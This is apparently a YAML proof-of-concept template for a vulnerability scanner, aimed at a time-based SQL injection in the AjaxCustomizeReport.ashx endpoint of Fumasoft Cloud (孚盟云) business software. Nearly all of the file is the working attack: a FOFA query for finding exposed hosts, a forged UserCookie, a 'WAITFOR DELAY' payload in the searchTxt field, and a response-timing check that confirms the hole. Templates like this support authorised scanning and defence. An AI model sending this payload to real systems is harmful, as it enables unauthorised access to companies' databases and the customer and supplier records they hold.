id: poc-yaml-fumasoft-ajaxcustomizereport-ashx-sqli
info:
  name: 孚盟云 AjaxCustomizeReport.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 孚盟云
  fofa: app="孚盟软件-孚盟云"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"孚盟云")
- method: POST
  path: /m/Dingding/Ajax/AjaxCustomizeReport.ashx
  headers:
    Cookie: UserCookie={"empId":"1"}
    Content-Type: application/x-www-form-urlencoded
  data: action=GetMouldList&searchTxt='WAITFOR DELAY '0:0:{{.t1}}'--
  expression: status_code == 200 && contains(body,"外销业务员询盘统计" ) && contains(body,"供应商质量统计表")
    && contains(body,"客户投诉统计") && duration > t1 && duration < t2
transport: http
